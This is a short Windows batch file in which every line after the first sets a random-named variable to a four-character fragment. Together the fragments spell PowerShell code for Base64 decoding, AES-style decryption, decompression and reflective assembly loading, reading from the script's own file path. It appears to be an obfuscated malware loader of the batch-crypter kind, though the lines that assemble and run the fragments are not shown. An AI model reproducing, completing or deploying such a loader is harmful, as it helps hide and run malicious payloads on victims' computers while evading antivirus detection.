@echo off
set "oJVJjUyhzX=pose"
set "yrxpJnKzup=dj0C"
set "HHncmiSdOb=)) {"
set "tLHeJIPcUN=ypto"
set "RwbPkBncdN=eMVs"
set "HbxzLMDkLO=urit"
set "iJURiOejLj=morF"
set "jANqWPIsCC=L4Yi"
set "eJLMvPiySx=e = "
set "kGPqnlNZkH='')("
set "YFYLHcDIYp=le  "
set "DwejcXmqrZ=ck($"
set "yeiSJZxMri=rt]:"
set "KLcPuAimwl=tji."
set "gLXoSDYssw=tS46"
set "uMNNcwxNqc=.Dis"
set "LHfCloTIFh=O.Me"
set "EKolGIiXUk=tryP"
set "SWRvuvkKYC=flec"
set "GbEqjvoQiZ=oryS"
set "hznNogpSql=pose"
set "rfKxCeTcZo=sion"
set "NkuSWsbJkO=Secu"
set "utsZVSrruU=bstr"
set "OivKyUTxEK=ylxI"
set "fQPJkDVFCF=$ylx"
set "yQacUsPzhP=zuZI"
set "sTlZvSqsWP=ptog"
set "MbVFRtbCwU=::De"
set "voEAdKpbjD=ylxI"
set "vXoiUoyGwO= New"
set "yxrtvAMABL=3); "
set "hoJVnzCvVu=PKCS"
set "pxKqgTIKEF=tsWi"
set "BhJUoqxyPh=oArr"
set "uyJlFrNHKP=:: '"
set "xOnWelHkNK=RmAx"
set "IrbRqTzwcU=;$QK"
set "rWvZNEcWdy=orF'"
set "pzurSEHOrR=).Sp"
set "HBoIowmLAf=eam("
set "IMqTPRBjyS='txe"
set "wWIRRtEsLB=vert"
set "xLRKeIGGNW=ekth"
set "ZuUKDcsqhr=xdfu"
set "eSlxBRUVsw=gth)"
set "fEIKSxAfqM=Ic ="
set "lCyEoaxsSD= [st"
set "fAWJsyOnPp=comm"
set "aSISgZGMgr=::('"
set "MotkicctQZ=.Len"
set "nEToNOXRYr=iron"
set "nrSIpiLqFS=l5E7"
set "NqyJYisgYy=.Con"
set "yPGjVITgHn=join"
set "AuAJaeQarA=('%*'"
set "lihiuaoWHT=();$"
set "SKYbyRKTPU=CFxo"
set "QtkGLOaBxh=ionM"
set "ydyqGdkUeU=lkq "
set "egpvcDshyW=m.IO"
set "GJvoSXlLGe=dpEa"
set "HjsuSEWmRE=yste"
set "agCvPtQrwm=d;$N"
set "TrfsenWisk=  $r"
set "mndQYnnBzP='gni"
set "hHIJgZUzxJ=zHhH"
set "otbrZDeeIN=('da"
set "gSKmoVHmmd=hQ.D"
set "PLcygFFBYZ=rofi"
set "mDbmbDqMBh=bjec"
set "qyuDFYvQVZ=ment"
set "nrjRWYnLvs= '')"
set "NviepZfMKf=Xtji"
set "pPEKfbpDNf=lBlo"
set "WZhfzJGXKF=..-1"
set "IQdZIRBMnx=$nle"
set "PbGQiYdLXj=Mode"
set "zypfyBpxOW=yste"
set "FkzUIpqjWh=ateD"
set "UdbamiTSTD=Bmor"
set "rsqQJyzlpA=tem."
set "KqYgplZMkN=em.I"
set "NxeDSoZBTW=kthQ"
set "QmnKnRxILw=th('"
set "ydmItlFKWQ=New-"
set "SaIemfgFqC=ddin"
set "Ejhkqicqwy=106u"
set "AdSqIEvfRM=ress"
set "rVLxyQkuhH=rans"
set "pHFMwiWvUG=$nle"
set "tgpcnpqFoO=);$N"
set "fGDAKUpkxw= '')"
set "wurfjBOyRv=ne);"
set "WKUIRWttQd=esMa"
set "sYBsPKwZrV=lxIc"
set "wCyyRroalK=dpEa"
set "KLPdLFcVOL=brea"
set "ZKnKWQNaXm=ke($"
set "jPspchDDrj=ode]"
set "arrsOHWKzc=join"
set "lvCHpRcxGI==');"
set "zWwuprVrmT=F) {"
set "oBYyMHlBkW=Ic);"
set "UTzmtItrQk=('%~f0'"
set "BRIycTuFgV=]::C"
set "kBkuPwMcSh=ct S"
